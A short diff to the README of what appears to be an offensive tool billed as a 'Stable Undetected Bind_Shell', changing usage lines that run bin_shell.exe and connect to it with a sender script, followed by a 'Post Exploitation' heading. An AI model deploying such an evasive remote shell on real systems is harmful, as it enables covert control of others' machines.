@@ -26,7 +26,7 @@ Stable Undetected Bind_Shell
 Download The repo or Compiled version As you like 
 
 Run bin_shell.exe <ip> <port> <Debug/NODebug>
-Now time to connect to our shell with Commend-Sender.py 127.0.0.1 5555
+Now time to connect to our shell with Commend-Sender.py <ip> <port>
 ```
 
 # Post Exploitation
